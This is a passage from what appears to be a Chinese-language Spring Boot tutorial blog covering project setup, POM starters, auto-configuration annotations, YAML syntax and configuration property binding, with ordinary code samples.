href="#3-整合mybatis">3、整合MyBatis</a><ul><li><a href="#4-注解版">4）、注解版</a></li><li><a href="#5-配置文件版">5）、配置文件版</a></li></ul></li><li><a href="#4-整合springdata-jpa">4、整合SpringData JPA</a><ul><li><a href="#1-springdata简介">1）、SpringData简介</a></li><li><a href="#2-整合springdata-jpa">2）、整合SpringData JPA</a></li></ul></li></ul></li><li><a href="#七-启动配置原理">七、启动配置原理</a><ul><li><a href="#1-创建springapplication对象"><strong>1、创建SpringApplication对象</strong></a></li><li><a href="#2-运行run方法">2、运行run方法</a></li><li><a href="#3-事件监听机制">3、事件监听机制</a></li></ul></li><li><a href="#八-自定义starter">八、自定义starter</a></li><li><a href="#更多springboot整合示例">更多SpringBoot整合示例</a></li></ul><!-- tocstop --><h1><span id="一-spring-boot-入门"><strong>一、</strong>Spring Boot 入门</span></h1><h2><span id="1-spring-boot-简介">1、Spring Boot 简介</span></h2><blockquote><p>简化Spring应用开发的一个框架；</p><p>整个Spring技术栈的一个大整合；</p><p>J2EE开发的一站式解决方案；</p></blockquote><h2><span id="2-微服务">2、微服务</span></h2><p>2014，martin fowler</p><p>微服务：架构风格（服务微化）</p><p>一个应用应该是一组小型服务；可以通过HTTP的方式进行互通；</p><p>单体应用：ALL IN ONE</p><p>微服务：每一个功能元素最终都是一个可独立替换和独立升级的软件单元；</p><p><a href="https://martinfowler.com/articles/microservices.html#MicroservicesAndSoa" target="_blank" rel="noopener">详细参照微服务文档</a></p><h2><span id="3-环境准备">3、环境准备</span></h2><p><a href="http://www.gulixueyuan.com/" target="_blank" rel="noopener">http://www.gulixueyuan.com/</a> 谷粒学院</p><p>环境约束</p><p>–jdk1.8：Spring Boot 推荐jdk1.7及以上；java version “1.8.0_112”</p><p>–maven3.x：maven 3.3以上版本；Apache Maven 3.3.9</p><p>–IntelliJIDEA2017：IntelliJ IDEA 2017.2.2 x64、STS</p><p>–SpringBoot 1.5.9.RELEASE：1.5.9；</p><p>统一环境；</p><h3><span id="1-maven设置">1、MAVEN设置；</span></h3><p>给maven 的settings.xml配置文件的profiles标签添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="2-idea设置">2、IDEA设置</span></h3><p>整合maven进来；</p><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180129151045.png" alt="idea设置"></p><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180129151112.png" alt="images/"></p><h2><span id="4-spring-boot-helloworld">4、Spring Boot HelloWorld</span></h2><p>一个功能：</p><p>浏览器发送hello请求，服务器接受请求并处理，响应Hello World字符串；</p><h3><span id="1-创建一个maven工程jar">1、创建一个maven工程；（jar）</span></h3><h3><span id="2-导入spring-boot相关的依赖">2、导入spring boot相关的依赖</span></h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="3-编写一个主程序启动spring-boot应用">3、编写一个主程序；启动Spring Boot应用</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@SpringBootApplication</span> 来标注一个主程序类，说明这是一个Spring Boot应用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldMainApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Spring应用启动起来</span></span><br><span class="line">        SpringApplication.run(HelloWorldMainApplication<span class="class">.<span class="keyword">class</span>,<span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="4-编写相关的controller-service">4、编写相关的Controller、Service</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/hello"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello World!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="5-运行主程序测试">5、运行主程序测试</span></h3><h3><span id="6-简化部署">6、简化部署</span></h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 这个插件，可以将应用打包成一个可执行的jar包；--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将这个应用打成jar包，直接使用java -jar的命令进行执行；</p><h2><span id="5-hello-world探究">5、Hello World探究</span></h2><h3><span id="1-pom文件">1、POM文件</span></h3><h4><span id="1-父项目">1、父项目</span></h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">他的父项目是</span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">relativePath</span>&gt;</span>../../spring-boot-dependencies<span class="tag">&lt;/<span class="name">relativePath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">他来真正管理Spring Boot应用里面的所有依赖版本；</span><br></pre></td></tr></table></figure><p>Spring Boot的版本仲裁中心；</p><p>以后我们导入依赖默认是不需要写版本；（没有在dependencies里面管理的依赖自然需要声明版本号）</p><h4><span id="2-启动器">2、启动器</span></h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>spring-boot-starter</strong>-==web==：</p><p>​    spring-boot-starter：spring-boot场景启动器；帮我们导入了web模块正常运行所依赖的组件；</p><p>Spring Boot将所有的功能场景都抽取出来，做成一个个的starters（启动器），只需要在项目里面引入这些starter相关场景的所有依赖都会导入进来。要用什么功能就导入什么场景的启动器</p><h3><span id="2-主程序类主入口类">2、主程序类，主入口类</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@SpringBootApplication</span> 来标注一个主程序类，说明这是一个Spring Boot应用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldMainApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Spring应用启动起来</span></span><br><span class="line">        SpringApplication.run(HelloWorldMainApplication<span class="class">.<span class="keyword">class</span>,<span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>@<strong>SpringBootApplication</strong>:    Spring Boot应用标注在某个类上说明这个类是SpringBoot的主配置类，SpringBoot就应该运行这个类的main方法来启动SpringBoot应用；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target</span>(ElementType.TYPE)</span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Inherited</span></span><br><span class="line"><span class="meta">@SpringBootConfiguration</span></span><br><span class="line"><span class="meta">@EnableAutoConfiguration</span></span><br><span class="line"><span class="meta">@ComponentScan</span>(excludeFilters = &#123;</span><br><span class="line">      <span class="meta">@Filter</span>(type = FilterType.CUSTOM, classes = TypeExcludeFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">      @<span class="title">Filter</span>(<span class="title">type</span> </span>= FilterType.CUSTOM, classes = AutoConfigurationExcludeFilter<span class="class">.<span class="keyword">class</span>) &#125;)</span></span><br><span class="line"><span class="class"><span class="title">public</span> @<span class="title">interface</span> <span class="title">SpringBootApplication</span> </span>&#123;</span><br></pre></td></tr></table></figure><p>@<strong>SpringBootConfiguration</strong>:Spring Boot的配置类；</p><p>​        标注在某个类上，表示这是一个Spring Boot的配置类；</p><p>​        @<strong>Configuration</strong>:配置类上来标注这个注解；</p><p>​            配置类 —–  配置文件；配置类也是容器中的一个组件；@Component</p><p>@<strong>EnableAutoConfiguration</strong>：开启自动配置功能；</p><p>​        以前我们需要配置的东西，Spring Boot帮我们自动配置；@<strong>EnableAutoConfiguration</strong>告诉SpringBoot开启自动配置功能；这样自动配置才能生效；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AutoConfigurationPackage</span></span><br><span class="line"><span class="meta">@Import</span>(EnableAutoConfigurationImportSelector<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> @<span class="title">interface</span> <span class="title">EnableAutoConfiguration</span> </span>&#123;</span><br></pre></td></tr></table></figure><p>​          @<strong>AutoConfigurationPackage</strong>：自动配置包</p><p>​        @<strong>Import</strong>(AutoConfigurationPackages.Registrar.class)：</p><p>​        Spring的底层注解@Import，给容器中导入一个组件；导入的组件由AutoConfigurationPackages.Registrar.class；</p><p>==将主配置类（@SpringBootApplication标注的类）的所在包及下面所有子包里面的所有组件扫描到Spring容器；==</p><p>​    @<strong>Import</strong>(EnableAutoConfigurationImportSelector.class)；</p><p>​        给容器中导入组件？</p><p>​        <strong>EnableAutoConfigurationImportSelector</strong>：导入哪些组件的选择器；</p><p>​        将所有需要导入的组件以全类名的方式返回；这些组件就会被添加到容器中；</p><p>​        会给容器中导入非常多的自动配置类（xxxAutoConfiguration）；就是给容器中导入这个场景需要的所有组件，并配置好这些组件；        <img src="images/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180129224104.png" alt="自动配置类"></p><p>有了自动配置类，免去了我们手动编写配置注入功能组件等的工作；</p><p>​        SpringFactoriesLoader.loadFactoryNames(EnableAutoConfiguration.class,classLoader)；</p><p>==Spring Boot在启动的时候从类路径下的META-INF/spring.factories中获取EnableAutoConfiguration指定的值，将这些值作为自动配置类导入到容器中，自动配置类就生效，帮我们进行自动配置工作；==以前我们需要自己配置的东西，自动配置类都帮我们；</p><p>J2EE的整体整合解决方案和自动配置都在spring-boot-autoconfigure-1.5.9.RELEASE.jar；</p><p>​        </p><p>==Spring注解版（谷粒学院）==</p><h2><span id="6-使用spring-initializer快速创建spring-boot项目">6、使用Spring Initializer快速创建Spring Boot项目</span></h2><h3><span id="1-idea使用-spring-initializer快速创建项目">1、IDEA：使用 Spring Initializer快速创建项目</span></h3><p>IDE都支持使用Spring的项目创建向导快速创建一个Spring Boot项目；</p><p>选择我们需要的模块；向导会联网创建Spring Boot项目；</p><p>默认生成的Spring Boot项目；</p><ul><li>主程序已经生成好了，我们只需要我们自己的逻辑</li><li>resources文件夹中目录结构<ul><li>static：保存所有的静态资源； js css  images；</li><li>templates：保存所有的模板页面；（Spring Boot默认jar包使用嵌入式的Tomcat，默认不支持JSP页面）；可以使用模板引擎（freemarker、thymeleaf）；</li><li>application.properties：Spring Boot应用的配置文件；可以修改一些默认设置；</li></ul></li></ul><h3><span id="2-sts使用-spring-starter-project快速创建项目">2、STS使用 Spring Starter Project快速创建项目</span></h3><hr><h1><span id="二-配置文件">二、配置文件</span></h1><h2><span id="1-配置文件">1、配置文件</span></h2><p>SpringBoot使用一个全局的配置文件，配置文件名是固定的；</p><p>•application.properties</p><p>•application.yml</p><p>配置文件的作用：修改SpringBoot自动配置的默认值；SpringBoot在底层都给我们自动配置好；</p><p>YAML（YAML Ain’t Markup Language）</p><p>​    YAML  A Markup Language：是一个标记语言</p><p>​    YAML   isn’t Markup Language：不是一个标记语言；</p><p>标记语言：</p><p>​    以前的配置文件；大多都使用的是  <strong>xxxx.xml</strong>文件；</p><p>​    YAML：<strong>以数据为中心</strong>，比json、xml等更适合做配置文件；</p><p>​    YAML：配置例子</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br></pre></td></tr></table></figure><p>​    XML：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">port</span>&gt;</span>8081<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br></pre></td></tr></table></figure><h2><span id="2-yaml语法">2、YAML语法：</span></h2><h3><span id="1-基本语法">1、基本语法</span></h3><p>k:(空格)v：表示一对键值对（空格必须有）；</p><p>以<strong>空格</strong>的缩进来控制层级关系；只要是左对齐的一列数据，都是同一个层级的</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/hello</span></span><br></pre></td></tr></table></figure><p>属性和值也是大小写敏感；</p><h3><span id="2-值的写法">2、值的写法</span></h3><h4><span id="字面量普通的值数字字符串布尔">字面量：普通的值（数字，字符串，布尔）</span></h4><p>​    k: v：字面直接来写；</p><p>​        字符串默认不用加上单引号或者双引号；</p><p>​        “”：双引号；不会转义字符串里面的特殊字符；特殊字符会作为本身想表示的意思</p><p>​                name:   “zhangsan \n lisi”：输出；zhangsan 换行  lisi</p><p>​        ‘’：单引号；会转义特殊字符，特殊字符最终只是一个普通的字符串数据</p><p>​                name:   ‘zhangsan \n lisi’：输出；zhangsan \n  lisi</p><h4><span id="对象-map属性和值键值对">对象、Map（属性和值）（键值对）：</span></h4><p>​    k: v：在下一行来写对象的属性和值的关系；注意缩进</p><p>​        对象还是k: v的方式</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">friends:</span></span><br><span class="line"><span class="attr">lastName:</span> <span class="string">zhangsan</span></span><br><span class="line"><span class="attr">age:</span> <span class="number">20</span></span><br></pre></td></tr></table></figure><p>行内写法：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">friends:</span> <span class="string">&#123;lastName:</span> <span class="string">zhangsan,age:</span> <span class="number">18</span><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h4><span id="数组list-set">数组（List、Set）：</span></h4><p>用- 值表示数组中的一个元素</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">pets:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">cat</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">dog</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">pig</span></span><br></pre></td></tr></table></figure><p>行内写法</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">pets:</span> <span class="string">[cat,dog,pig]</span></span><br></pre></td></tr></table></figure><h2><span id="3-配置文件值注入">3、配置文件值注入</span></h2><p>配置文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">person:</span></span><br><span class="line">    <span class="attr">lastName:</span> <span class="string">hello</span></span><br><span class="line">    <span class="attr">age:</span> <span class="number">18</span></span><br><span class="line">    <span class="attr">boss:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">birth:</span> <span class="number">2017</span><span class="string">/12/12</span></span><br><span class="line">    <span class="attr">maps:</span> <span class="string">&#123;k1:</span> <span class="string">v1,k2:</span> <span class="number">12</span><span class="string">&#125;</span></span><br><span class="line">    <span class="attr">lists:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">lisi</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">zhaoliu</span></span><br><span class="line">    <span class="attr">dog:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">小狗</span></span><br><span class="line">      <span class="attr">age:</span> <span class="number">12</span></span><br></pre></td></tr></table></figure><p>javaBean：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将配置文件中配置的每一个属性的值，映射到这个组件中</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ConfigurationProperties</span>：告诉SpringBoot将本类中的所有属性和配置文件中相关的配置进行绑定；</span></span><br><span class="line"><span class="comment"> *      prefix = "person"：配置文件中哪个下面的所有属性进行一一映射</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 只有这个组件是容器中的组件，才能容器提供的<span class="doctag">@ConfigurationProperties</span>功能；</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"person"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Boolean boss;</span><br><span class="line">    <span class="keyword">private</span> Date birth;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,Object&gt; maps;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Object&gt; lists;</span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br></pre></td></tr></table></figure><p>我们可以导入配置文件处理器，以后编写配置就有提示了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--导入配置文件处理器，配置文件进行绑定就会有提示--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4><span id="1-properties配置文件在idea中默认utf-8可能会乱码">1、properties配置文件在idea中默认utf-8可能会乱码</span></h4><p>调整</p><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180130161620.png" alt="idea配置乱码"></p><h4><span id="2-value获取值和configurationproperties获取值比较">2、@Value获取值和@ConfigurationProperties获取值比较</span></h4><table><thead><tr><th></th><th>@ConfigurationProperties</th><th>@Value</th></tr></thead><tbody><tr><td>功能</td><td>批量注入配置文件中的属性</td><td>一个个指定</td></tr><tr><td>松散绑定（松散语法）</td><td>支持</td><td>不支持</td></tr><tr><td>SpEL</td><td>不支持</td><td>支持</td></tr><tr><td>JSR303数据校验</td><td>支持</td><td>不支持</td></tr><tr><td>复杂类型封装</td><td>支持</td><td>不支持</td></tr></tbody></table><p>配置文件yml还是properties他们都能获取到值；</p><p>如果说，我们只是在某个业务逻辑中需要获取一下配置文件中的某项值，使用@Value；</p><p>如果说，我们专门编写了一个javaBean来和配置文件进行映射，我们就直接使用@ConfigurationProperties；</p><h4><span id="3-配置文件注入值数据校验">3、配置文件注入值数据校验</span></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"person"</span>)</span><br><span class="line"><span class="meta">@Validated</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span 